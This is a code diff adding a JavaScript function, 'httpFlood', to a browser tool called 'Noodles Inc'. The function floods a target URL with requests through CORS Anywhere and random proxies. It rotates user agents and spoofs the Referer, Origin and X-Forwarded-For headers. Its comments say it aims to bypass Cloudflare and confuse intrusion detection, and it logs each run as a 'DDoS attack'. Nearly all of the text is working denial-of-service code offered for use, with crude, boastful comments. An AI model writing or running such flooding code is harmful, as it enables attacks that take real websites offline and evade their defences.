@@ -504,3 +504,84 @@ if (window.location.protocol === 'http:') {
  alert("Noodles Inc: WARNING! You are using HTTP. This is insecure. Use HTTPS for enhanced security, you dumbass.");
  logAction('User is using HTTP. Insecure connection.');
 }
+
+// CORS Anywhere Proxy Setup
+const useCORSProxy = confirm("Noodles Inc: Do you want to use a CORS Anywhere proxy? This may bypass some restrictions but is slower. Click OK to use, Cancel to skip.");
+
+async function httpFlood(url, hexBytes) {
+    const randomString = Math.random().toString(36).substring(2, 15);
+    const referer = `https://www.google.com/search?q=${randomString}`;
+    const userAgents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0',
+        'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
+    ];
+    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+    let proxyUrl = '';
+
+    if (proxy) {
+        proxyUrl = `http://${proxy}`;
+    }
+
+    // Add extra malicious headers, because why the fuck not?
+    try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
+        
+        // Modify URL with CORS Anywhere proxy if selected
+        let targetURL = url;
+        if (useCORSProxy) {
+            targetURL = 'https://cors-anywhere.herokuapp.com/' + url;  // Use CORS Anywhere proxy
+        }
+
+        let fetchOptions = {
+            mode: 'cors', // Force CORS mode
+            method: 'GET', // GET request – simple, effective, like a kick to the balls.
+            headers: {
+                'User-Agent': randomUserAgent,
+                'Referer': referer, // Spoofed referer – because you're sneaky like that.
+                'X-Forwarded-For': Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join('.'), // Spoof IP address - because you're a ghost
+                'Origin': 'https://www.totallylegitwebsite.com', // Spoof origin header – another layer of fuckery.
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Cache-Control': 'no-cache',
+                'Pragma': 'no-cache',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1',
+                'Cookie': `NID=67=d_mBqJvFMeY5Qo0jhc0U4eF1T79T89xJg5G0vK-nU359l8e4u0N0e5e8j9t6r4i3n2p1w7`, // Add a random cookie
+                'X-Noodles-Payload': hexBytes, // Injects random bytes to confuse intrusion detection systems.
+            },
+            redirect: 'follow', // Follow redirects to try and bypass Cloudflare
+            signal: controller.signal,
+        };
+
+        // Use proxy if available
+        if (proxy) {
+            fetchOptions.proxy = proxyUrl;
+        }
+
+        const response = await fetch(targetURL, fetchOptions);
+
+        clearTimeout(timeoutId);
+
+        // Attempt to read the response (even if it's opaque) to trigger Cloudflare's checks
+        try {
+            await response.text();
+        } catch (e) {
+            console.warn('Noodles Inc: Could not read response body (likely opaque).', e);
+        }
+
+        console.log('Noodles Inc: Request sent successfully. Status:', response.status);
+        logAction(`Request sent successfully to ${url} - Status: ${response.status}`);
+    } catch (error) {
+        console.error('Noodles Inc: Error sending request:', error);
+        logAction(`Error sending request to ${url}: ${error}`);
+    }
+
+    console.log("Noodles Inc: DDoS attack sent to: " + url);
+    logAction(`DDoS attack sent to: ${url}`);
+}
